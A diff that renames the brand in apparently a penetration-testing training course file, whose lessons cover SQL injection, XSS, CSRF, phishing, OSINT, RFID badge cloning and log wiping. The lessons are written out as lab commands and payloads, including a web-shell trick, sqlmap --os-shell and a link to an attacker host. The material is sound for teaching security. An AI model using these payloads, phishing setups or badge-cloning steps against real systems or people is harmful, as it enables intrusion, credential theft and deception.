+curl -H "Accept: application/vnd.qyvora.v2+json" http://<target_ip>1/data
 \`\`\`
 
 **Identifying Security Posture:**
@@ -2514,7 +2514,7 @@ for url in <app_internal> <api_internal> <dev_internal>; do curl -s -I $url | gr
 curl -s -I http://<target_ip>1 | grep "Set-Cookie"
 \`\`\`
 
-*Hacker's Strategy:* If you see \`X-Powered-By: PHP/5.5\`, you've just found a legacy system. Older versions of languages are riddled with documented vulnerabilities that are trivial for an HSociety operative to exploit.`,
+*Hacker's Strategy:* If you see \`X-Powered-By: PHP/5.5\`, you've just found a legacy system. Older versions of languages are riddled with documented vulnerabilities that are trivial for an Qyvora operative to exploit.`,
               image: 'step-02.webp',
             },
             {
@@ -2530,7 +2530,7 @@ curl -s -I http://<target_ip>1 | grep "Set-Cookie"
 **Interacting with Cookies via CLI:**
 \`\`\`bash
 # Capture cookies from a login attempt into a file
-curl -c cookies.txt -d "user=hacker&pass=HSociety123" http://<target_ip>1/login
+curl -c cookies.txt -d "user=hacker&pass=Qyvora123" http://<target_ip>1/login
 
 # Use the captured cookie file for subsequent authenticated requests
 curl -b cookies.txt http://<target_ip>1/dashboard
@@ -2573,7 +2573,7 @@ curl -b "session=OLD_TOKEN" http://<target_ip>1/profile -I
             {
               title: 'Intercepting Traffic with Burp Suite',
               instruction:
-                `Burp Suite is the 'Command Center' for web exploitation. It sits between your browser and the server, allowing an HSociety operative to pause, modify, and replay traffic at will. To become a hacker is to move beyond what the browser *wants* you to send.
+                `Burp Suite is the 'Command Center' for web exploitation. It sits between your browser and the server, allowing an Qyvora operative to pause, modify, and replay traffic at will. To become a hacker is to move beyond what the browser *wants* you to send.
 
 **The Operative's Setup:**
 1. Start Burp: \`burpsuite &\`.
@@ -2621,7 +2621,7 @@ Use the Site Map to build a visual tree of every folder and file discovered on \
           id: 'room2',
           title: 'OWASP Top 10 Overview',
           overview:
-            "The OWASP Top 10 is the definitive list of the most critical web security risks. As an HSociety operative, you must know these categories by heart. This room takes you beyond the definitions, showing you how to detect and demonstrate the impact of each vulnerability using professional tools and techniques.",
+            "The OWASP Top 10 is the definitive list of the most critical web security risks. As an Qyvora operative, you must know these categories by heart. This room takes you beyond the definitions, showing you how to detect and demonstrate the impact of each vulnerability using professional tools and techniques.",
           estimatedMinutes: 35,
           steps: [
             {
@@ -2677,7 +2677,7 @@ nmap -p 80 --script http-enum <target_ip>
 curl -s http://<target_ip>/nonexistent_path_12345 | grep -i "server"
 \`\`\`
 
-*Operative Drill:* Which of these five categories do you think is hardest to detect with automated scanners? Why does an HSociety operative provide more value than a tool?`,
+*Operative Drill:* Which of these five categories do you think is hardest to detect with automated scanners? Why does an Qyvora operative provide more value than a tool?`,
               image: 'step-01.webp',
             },
             {
@@ -2733,13 +2733,13 @@ curl "http://<target_ip>/view?url=http://localhost:3306"
 curl "http://<target_ip>/view?url=http://internal-db:8080/phpmyadmin"
 \`\`\`
 
-*HSociety Insight:* SSRF (A10) is one of the most prized findings in cloud environments. It often allows an operative to steal IAM roles and gain full control over the infrastructure.`,
+*Qyvora Insight:* SSRF (A10) is one of the most prized findings in cloud environments. It often allows an operative to steal IAM roles and gain full control over the infrastructure.`,
               image: null,
             },
             {
               title: 'Identifying OWASP Issues: The Operative\'s Checklist',
               instruction:
-                `Theory is the map, but reconnaissance is the territory. As an HSociety operative, you must follow a systematic checklist to ensure every 'layer' of the OWASP Top 10 is tested against the target.
+                `Theory is the map, but reconnaissance is the territory. As an Qyvora operative, you must follow a systematic checklist to ensure every 'layer' of the OWASP Top 10 is tested against the target.
 
 **Reconnaissance & Surface Mapping:**
 \`\`\`bash
@@ -2792,7 +2792,7 @@ curl -v http://<target_ip>/api/admin/config > evidence_A01.txt 2>&1
             {
               title: 'Remediation: The Defensive Mindset',
               instruction:
-                `To train like a hacker is to also understand the cure. An HSociety operative doesn't just break things; they provide the solution. This is what separates a professional from a vandal.
+                `To train like a hacker is to also understand the cure. An Qyvora operative doesn't just break things; they provide the solution. This is what separates a professional from a vandal.
 
 **Secure Coding Patterns:**
 \`\`\`javascript
@@ -2853,7 +2853,7 @@ res.send("<h1>Hello " + encodeHTML(req.query.name) + "</h1>");
           id: 'room3',
           title: 'SQL Injection',
           overview:
-            "SQL Injection (SQLi) is the 'Skeleton Key' of web exploitation. It allows an HSociety operative to step past the front door and talk directly to the database. In this room, you will learn to dismantle queries from the inside out, bypassing authentication and extracting the crown jewels of the HSociety target: the user credentials.",
+            "SQL Injection (SQLi) is the 'Skeleton Key' of web exploitation. It allows an Qyvora operative to step past the front door and talk directly to the database. In this room, you will learn to dismantle queries from the inside out, bypassing authentication and extracting the crown jewels of the Qyvora target: the user credentials.",
           estimatedMinutes: 45,
           steps: [
             {
@@ -2911,7 +2911,7 @@ curl "http://<target_ip>/api/products?id=1%27%20OR%201=1%2d%2d%20"
 curl "http://<target_ip>/api/products?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- "
 \`\`\`
 
-*Operative Drill:* Why is a 'Blind' SQL injection more difficult to exploit than an 'Error-Based' one? How does an HSociety operative use 'Time-Based' delays to extract data?`,
+*Operative Drill:* Why is a 'Blind' SQL injection more difficult to exploit than an 'Error-Based' one? How does an Qyvora operative use 'Time-Based' delays to extract data?`,
               image: null,
             },
             {
@@ -2965,7 +2965,7 @@ curl "http://<target_ip>/api/products?id=1 UNION SELECT username,password FROM u
             {
               title: 'UNION-Based Data Exfiltration',
               instruction:
-                `UNION-based injection is the fastest way to extract massive amounts of data from an HSociety target. It works by appending your own query results to the legitimate ones returned by the application.
+                `UNION-based injection is the fastest way to extract massive amounts of data from an Qyvora target. It works by appending your own query results to the legitimate ones returned by the application.
 
 **1. Determining the Column Count:**
 The UNION operator requires the same number of columns in both queries.
@@ -3010,13 +3010,13 @@ In high-privilege scenarios, the database can read local files.
 curl "http://<target_ip>/api/products?id=1 UNION SELECT LOAD_FILE('/etc/passwd'),NULL"
 \`\`\`
 
-*Operative Insight:* Always check if you can write files too! \`SELECT ... INTO OUTFILE '/var/www/html/shell.php'\` is how an HSociety operative turns a SQL injection into a full web shell.`,
+*Operative Insight:* Always check if you can write files too! \`SELECT ... INTO OUTFILE '/var/www/html/shell.php'\` is how an Qyvora operative turns a SQL injection into a full web shell.`,
               image: null,
             },
             {
               title: 'Automation & Precision: Sqlmap Mastery',
               instruction:
-                `Manual injection is for discovery; \`sqlmap\` is for industrial-scale extraction. As an HSociety operative, you must master the flags of this powerful engine to bypass WAFs and automate the tedious parts of the engagement.
+                `Manual injection is for discovery; \`sqlmap\` is for industrial-scale extraction. As an Qyvora operative, you must master the flags of this powerful engine to bypass WAFs and automate the tedious parts of the engagement.
 
 **1. Basic Automated Probing:**
 \`\`\`bash
@@ -3032,8 +3032,8 @@ sqlmap -u "http://<target_ip>/api/products?id=1" --dbs --is-dba
 
 **3. Targeting Specific Data:**
 \`\`\`bash
-# Dump the 'users' table from the 'hsociety_prod' database
-sqlmap -u "http://<target_ip>/api/products?id=1" -D hsociety_prod -T users --dump
+# Dump the 'users' table from the 'qyvora_prod' database
+sqlmap -u "http://<target_ip>/api/products?id=1" -D qyvora_prod -T users --dump
 \`\`\`
 
 **4. Handling POST Requests & Cookies:**
@@ -3058,7 +3058,7 @@ sqlmap -u "http://<target_ip>/api/products?id=1" --tamper=space2comment
 sqlmap -u "http://<target_ip>/api/products?id=1" --os-shell
 \`\`\`
 
-*Final Training Project:* Perform a full audit of the HSociety target app. Document the vulnerable parameter, the database version, and extract the admin hash. Then, write a one-paragraph 'Remediation Guide' for the developers, explaining how to use **Parameterized Queries** to kill this bug forever.`,
+*Final Training Project:* Perform a full audit of the Qyvora target app. Document the vulnerable parameter, the database version, and extract the admin hash. Then, write a one-paragraph 'Remediation Guide' for the developers, explaining how to use **Parameterized Queries** to kill this bug forever.`,
               image: null,
             },
           ],
@@ -3073,13 +3073,13 @@ sqlmap -u "http://<target_ip>/api/products?id=1" --os-shell
             {
               title: 'Cross-Site Scripting (XSS): Code Execution',
               instruction:
-                `XSS isn't just about 'alerts'; it's about full JavaScript execution in a victim's session. To become an HSociety operative, you must learn to identify where an application fails to 'sanitize' user input, allowing your payload to be rendered as code.
+                `XSS isn't just about 'alerts'; it's about full JavaScript execution in a victim's session. To become an Qyvora operative, you must learn to identify where an application fails to 'sanitize' user input, allowing your payload to be rendered as code.
 
 **1. Reflected XSS (The Immediate Echo):**
 The payload is sent in the URL and reflected back.
 \`\`\`bash
 # Basic alert to prove execution
-curl "http://<target_ip>/search?q=<script>alert('HSociety')</script>"
+curl "http://<target_ip>/search?q=<script>alert('Qyvora')</script>"
 
 # Bypassing simple filters with an image tag
 curl "http://<target_ip>/search?q=<img src=x onerror=alert(1)>"
@@ -3120,13 +3120,13 @@ curl "http://<target_ip>/search?q=<scr<script>ipt>alert(1)</script>"
 nmap -p 80 --script http-xssed <target_ip>
 \`\`\`
 
-*Operative Drill:* Why is Stored XSS considered more dangerous than Reflected XSS in a professional engagement? How can an HSociety operative use Stored XSS to compromise an entire organization?`,
+*Operative Drill:* Why is Stored XSS considered more dangerous than Reflected XSS in a professional engagement? How can an Qyvora operative use Stored XSS to compromise an entire organization?`,
               image: null,
             },
             {
               title: 'XSS Impact: Weaponizing the Session',
               instruction:
-                `An HSociety operative doesn't stop at an \`alert()\`. The goal of XSS is to gain control. By stealing session cookies or capturing keystrokes, you can effectively become the victim within the application.
+                `An Qyvora operative doesn't stop at an \`alert()\`. The goal of XSS is to gain control. By stealing session cookies or capturing keystrokes, you can effectively become the victim within the application.
 
 **1. Cookie Theft & Exfiltration:**
 \`\`\`javascript
@@ -3179,13 +3179,13 @@ echo "c2Vzc2lvbj10cmFpbmVlXzEyMw==" | base64 -d
 </script>
 \`\`\`
 
-*Training Task:* Identify a page on the HSociety target that reflects your name. Inject a payload that changes the background color of the page to black. Then, upgrade it to a payload that logs \`document.domain\` to your console.`,
+*Training Task:* Identify a page on the Qyvora target that reflects your name. Inject a payload that changes the background color of the page to black. Then, upgrade it to a payload that logs \`document.domain\` to your console.`,
               image: null,
             },
             {
               title: 'Cross-Site Request Forgery (CSRF): The Forced Action',
               instruction:
-                `CSRF is the art of 'Identity Theft by Proxy.' It works because browsers automatically include cookies with requests to a domain, allowing an HSociety operative to force a victim to perform actions (like changing a password) simply by visiting a malicious page.
+                `CSRF is the art of 'Identity Theft by Proxy.' It works because browsers automatically include cookies with requests to a domain, allowing an Qyvora operative to force a victim to perform actions (like changing a password) simply by visiting a malicious page.
 
 **1. Identifying Vunerable Actions:**
 Look for state-changing requests (POST/PUT/DELETE) that lack a random token.
@@ -3236,7 +3236,7 @@ curl -b "session=hacker_token" -d "token=VICTIM_TOKEN" ...
 curl -e "http://<target_ip>/" -d "action=delete" http://<target_ip>/api/data
 \`\`\`
 
-*Operative Insight:* CSRF tokens must be **Random, Unique per session, and Validated on the server**. If any of these are missing, the HSociety operative has an opening.`,
+*Operative Insight:* CSRF tokens must be **Random, Unique per session, and Validated on the server**. If any of these are missing, the Qyvora operative has an opening.`,
               image: null,
             },
             {
@@ -3471,7 +3471,7 @@ Write findings for every authentication weakness you discovered. Be specific —
           id: 'room1',
           title: 'Phishing & Pretexting',
           overview:
-            "The most sophisticated firewall in the world is useless if a user is tricked into opening the gate. In this room, you will master the art of 'Human Hacking,' learning the psychological triggers and technical spoofing methods used by HSociety operatives to bypass digital defenses. To train like a hacker is to understand that the human brain is the most vulnerable OS on the network.",
+            "The most sophisticated firewall in the world is useless if a user is tricked into opening the gate. In this room, you will master the art of 'Human Hacking,' learning the psychological triggers and technical spoofing methods used by Qyvora operatives to bypass digital defenses. To train like a hacker is to understand that the human brain is the most vulnerable OS on the network.",
           estimatedMinutes: 35,
           steps: [
             {
@@ -3479,7 +3479,7 @@ Write findings for every authentication weakness you discovered. Be specific —
               instruction:
                 `To become a hacker, you must learn to speak the language of the target's subconscious. Social engineering isn't about lying; it's about creating a reality where compliance is the only logical choice.
 
-**The Six Principles of HSociety Influence:**
+**The Six Principles of Qyvora Influence:**
 
 1.  **Authority:** Impersonating IT support or an executive.
 2.  **Urgency:** Creating a 'crisis' that requires immediate action.
@@ -3500,7 +3500,7 @@ cewl -d 2 -m 5 http://<target_ip> -w custom_pretext.txt
 **Identifying Employee Patterns:**
 \`\`\`bash
 # Search for target employees on LinkedIn via Google Dorking
-site:<social_professional_site>/in "HSociety" "Engineer"
+site:<social_professional_site>/in "Qyvora" "Engineer"
 
 # Construct a list of potential targets based on job titles
 echo "admin@<target_ip>" >> targets.txt
@@ -3513,7 +3513,7 @@ echo "hr@<target_ip>" >> targets.txt
 dnstwist --format csv <target_ip> > typosquats.csv
 \`\`\`
 
-*Operative Drill:* Look at a real phishing email. Identify the 'Call to Action.' Does it use Urgency ("Reset now") or Authority ("By order of the CEO")? How would an HSociety operative combine both?`,
+*Operative Drill:* Look at a real phishing email. Identify the 'Call to Action.' Does it use Urgency ("Reset now") or Authority ("By order of the CEO")? How would an Qyvora operative combine both?`,
               image: null,
             },
             {
@@ -3533,7 +3533,7 @@ dig _dmarc.<target_ip> TXT
 **2. Crafting the Malicious Link:**
 \`\`\`bash
 # Use a URL shortener to hide the true destination (e.g., bit.ly)
-# http://bit.ly/hsociety-training -> http://<attacker_ip>/login-clone
+# http://bit.ly/qyvora-training -> http://<attacker_ip>/login-clone
 
 # Create an HTML-encoded link to bypass basic scanners
 echo -n "http://<attacker_ip>/steal" | base64
@@ -3603,7 +3603,7 @@ Playing a recording of a busy call center or server room during the call to rein
 **6. Automated Target Profiling:**
 \`\`\`bash
 # Search for target mentions in news or press releases to find 'Hooks'
-site:news.<search_engine> "HSociety" "Acquisition"
+site:news.<search_engine> "Qyvora" "Acquisition"
 \`\`\`
 
 *Training Task:* You are pretending to be James from IT. Your goal is to get a trainee to reveal their 'Agent ID.' Write a 3-sentence script that uses the **Reciprocity** principle (give a tip, get an ID).`,
@@ -3612,7 +3612,7 @@ site:news.<search_engine> "HSociety" "Acquisition"
             {
               title: 'Defensive Counter-Measures',
               instruction:
-                `To train like a hacker is to know how the enemy thinks—and how to stop them. As an HSociety operative, you must be able to train others to spot the subtle 'glitches' in a social engineering attack.
+                `To train like a hacker is to know how the enemy thinks—and how to stop them. As an Qyvora operative, you must be able to train others to spot the subtle 'glitches' in a social engineering attack.
 
 **1. Technical Verification:**
 \`\`\`bash
@@ -3637,9 +3637,9 @@ Using automated tools to open links and attachments in a secure 'bubble' before 
 If users use password managers, they are less likely to type their password into a phishing site (because the manager won't recognize the fake domain).
 
 **6. Reporting Procedures:**
-Establish a 'One-Click' reporting system where users can flag suspicious emails directly to the HSociety security team.
+Establish a 'One-Click' reporting system where users can flag suspicious emails directly to the Qyvora security team.
 
-*Final Insight:* Social engineering is the only attack that works on every platform. Whether it's Linux, Windows, or Cloud, the human is always the weakest link. Congratulations on completing this unit of the HSociety Operative program.`,
+*Final Insight:* Social engineering is the only attack that works on every platform. Whether it's Linux, Windows, or Cloud, the human is always the weakest link. Congratulations on completing this unit of the Qyvora Operative program.`,
               image: null,
             },
           ],
@@ -3648,7 +3648,7 @@ Establish a 'One-Click' reporting system where users can flag suspicious emails 
           id: 'room2',
           title: 'OSINT Fundamentals',
           overview:
-            "Before you ever touch a keyboard on a target system, you must know it better than its own owners. Open Source Intelligence (OSINT) is the art of gathering the pieces of a puzzle from the public domain. In this room, you will learn to use the internet as your primary reconnaissance tool, harvesting data from search engines, social media, and hidden databases to build a complete profile of the HSociety target.",
+            "Before you ever touch a keyboard on a target system, you must know it better than its own owners. Open Source Intelligence (OSINT) is the art of gathering the pieces of a puzzle from the public domain. In this room, you will learn to use the internet as your primary reconnaissance tool, harvesting data from search engines, social media, and hidden databases to build a complete profile of the Qyvora target.",
           estimatedMinutes: 35,
           steps: [
             {
@@ -3717,7 +3717,7 @@ The Google Hacking Database (GHDB) is your library of pre-built dorks.
             {
               title: 'Automated OSINT: The Harvester & Shodan',
               instruction:
-                `Manually searching is for surgical strikes; automation is for total theater awareness. HSociety operatives use powerful engines to aggregate data from hundreds of sources simultaneously, mapping out an organization's entire digital footprint in seconds.
+                `Manually searching is for surgical strikes; automation is for total theater awareness. Qyvora operatives use powerful engines to aggregate data from hundreds of sources simultaneously, mapping out an organization's entire digital footprint in seconds.
 
 **1. Aggregating Emails & Subdomains:**
 \`\`\`bash
@@ -3731,8 +3731,8 @@ theHarvester -d <target_ip> -b all | grep "@" | sort -u > emails.txt
 **2. Shodan: The Search Engine for Things:**
 Shodan scans the entire internet every day, indexing every open port and service.
 \`\`\`bash
-# Find all HSociety-owned assets indexed by Shodan
-shodan search org:"HSociety Corp"
+# Find all Qyvora-owned assets indexed by Shodan
+shodan search org:"Qyvora Corp"
 
 # Identify specific vulnerable services (e.g., old SSH)
 shodan search "port:22 product:OpenSSH version:7.2"
@@ -3744,7 +3744,7 @@ shodan search "port:22 product:OpenSSH version:7.2"
 shodan host <target_ip>
 
 # See which ports are 'trending' in a specific organization
-shodan stats org:"HSociety" port
+shodan stats org:"Qyvora" port
 \`\`\`
 
 **4. Recon-ng: The Modular Framework:**
@@ -3780,15 +3780,15 @@ dig +short <target_ip> | xargs -I {} curl -s "https://api.hacker<target_site>/re
             {
               title: 'Social Media OSINT & Human Mapping',
               instruction:
-                `An organization isn't just servers; it's people. To train like a hacker is to build a 'Social Graph' of the target. By analyzing LinkedIn, X (Twitter), and GitHub, an HSociety operative can find the right person to target for a phishing or vishing attack.
+                `An organization isn't just servers; it's people. To train like a hacker is to build a 'Social Graph' of the target. By analyzing LinkedIn, X (Twitter), and GitHub, an Qyvora operative can find the right person to target for a phishing or vishing attack.
 
 **1. Mapping the Org Chart via LinkedIn:**
 \`\`\`bash
 # Use a specific Dork to find decision makers
-site:<social_professional_site>/in "HSociety" "Director" OR "VP"
+site:<social_professional_site>/in "Qyvora" "Director" OR "VP"
 
 # Identify the IT and Security staff
-site:<social_professional_site>/in "HSociety" "Security Analyst" OR "SysAdmin"
+site:<social_professional_site>/in "Qyvora" "Security Analyst" OR "SysAdmin"
 \`\`\`
 
 **2. Building Naming Convention Lists:**
@@ -3811,7 +3811,7 @@ site:<code_repo_site> "<target_ip>" "api_key"
 **4. Identifying Technology via Job Posts:**
 \`\`\`bash
 # Search job boards to see what the target is hiring for
-site:<job_site> "HSociety" "AWS" "Kubernetes"
+site:<job_site> "Qyvora" "AWS" "Kubernetes"
 # (This tells you they use AWS and K8s!)
 \`\`\`
 
@@ -3819,7 +3819,7 @@ site:<job_site> "HSociety" "AWS" "Kubernetes"
 Operatives look for employee photos that accidentally show badges or internal office layouts.
 \`\`\`bash
 # Use Google Image search to find office photos
-site:<social_media_site> "HSociety" "office"
+site:<social_media_site> "Qyvora" "office"
 \`\`\`
 
 **6. Passive DNS History:**
@@ -3828,7 +3828,7 @@ site:<social_media_site> "HSociety" "office"
 curl -s "https://api.hacker<target_site>/reversedns/?q=<target_ip>"
 \`\`\`
 
-*Operative Drill:* Find a public GitHub repo for a large project. Can you find any 'TODO' comments in the code that mention security issues? These are often the 'First Domino' in an HSociety engagement.`,
+*Operative Drill:* Find a public GitHub repo for a large project. Can you find any 'TODO' comments in the code that mention security issues? These are often the 'First Domino' in an Qyvora engagement.`,
               image: null,
             },
             {
@@ -3858,7 +3858,7 @@ exiftool -all= engagement_screenshot.webp
 \`\`\`
 
 **4. Secure Communication:**
-Always use encrypted channels (Signal, PGP, ProtonMail) when discussing engagement details with your HSociety team.
+Always use encrypted channels (Signal, PGP, ProtonMail) when discussing engagement details with your Qyvora team.
 
 **5. Disposable Personas (Sock Puppets):**
 Create 'Burner' accounts for social media research. Never use your real identity, phone number, or photo.
@@ -3882,7 +3882,7 @@ history -c
           id: 'room3',
           title: 'Physical Security',
           overview:
-            "Physical access is the ultimate bypass. All the digital firewalls in the world are useless if an HSociety operative can simply walk into the server room and plug in a USB. In this room, you will learn the techniques of physical intrusion, from tailgating and badge cloning to the art of the social engineer's 'walk-through.' To become a hacker is to understand that the lock on the door is just another protocol to be cracked.",
+            "Physical access is the ultimate bypass. All the digital firewalls in the world are useless if an Qyvora operative can simply walk into the server room and plug in a USB. In this room, you will learn the techniques of physical intrusion, from tailgating and badge cloning to the art of the social engineer's 'walk-through.' To become a hacker is to understand that the lock on the door is just another protocol to be cracked.",
           estimatedMinutes: 30,
           steps: [
             {
@@ -3905,14 +3905,14 @@ history -c
 
 **Simulating a Badge Inspection:**
 \`\`\`bash
-# Create a high-resolution template for a fake HSociety employee ID
+# Create a high-resolution template for a fake Qyvora employee ID
 # Tools: Photoshop/GIMP (Graphic design skills are a hacker's asset)
 \`\`\`
 
 **Identifying Building Infrastructure:**
 \`\`\`bash
 # Search building permit records to find floor plans and server room locations
-site:<gov_site> "HSociety Corp" "Floor Plan"
+site:<gov_site> "Qyvora Corp" "Floor Plan"
 \`\`\`
 
 **Interrogating Access Control Hardware:**
@@ -3940,7 +3940,7 @@ hcitool scan
             {
               title: 'RFID Mastery & Badge Cloning',
               instruction:
-                `Most modern offices use RFID badges for access. To become an HSociety operative, you must master the tools that allow you to read, clone, and replay these credentials. If you have the card's data, you have the building's keys.
+                `Most modern offices use RFID badges for access. To become an Qyvora operative, you must master the tools that allow you to read, clone, and replay these credentials. If you have the card's data, you have the building's keys.
 
 **1. Identifying RFID Frequencies:**
 - **Low Frequency (125 kHz):** HID Prox, Indala. (Older, easy to clone).
@@ -3992,7 +3992,7 @@ pm3 -c "lf hid sim --raw 2006f1a23b"
             {
               title: 'Dumpster Diving & Data Reconstruction',
               instruction:
-                `One person's trash is an HSociety operative's treasure. Dumpster diving provides a wealth of OSINT and technical data that can be used to build a pretext, find credentials, or map internal systems. Information is only 'deleted' when it is destroyed.
+                `One person's trash is an Qyvora operative's treasure. Dumpster diving provides a wealth of OSINT and technical data that can be used to build a pretext, find credentials, or map internal systems. Information is only 'deleted' when it is destroyed.
 
 **High-Value Trash Targets:**
 - **Unshredded Documents:** Org charts, meeting notes, project plans.
@@ -4056,12 +4056,12 @@ sudo rfkill block all
 - **No Evidence:** Never leave your own trash or notes behind.
 
 **4. Implementing the 'Authorisation' Buffer:**
-Always carry a 'Get Out of Jail Free' card—the signed authorization letter from the HSociety client. If challenged, stay calm and present the letter.
+Always carry a 'Get Out of Jail Free' card—the signed authorization letter from the Qyvora client. If challenged, stay calm and present the letter.
 
 **5. Post-Engagement Sanitization:**
 \`\`\`bash
 # Wipe the logs of any 'Drop-Box' you left behind on the network
-rm -rf /var/log/hsociety_persistence.log
+rm -rf /var/log/qyvora_persistence.log
 
 # Overwrite free space on your field laptop
 dd if=/dev/zero of=/tmp/wipe.tmp bs=1M; rm /tmp/wipe.tmp
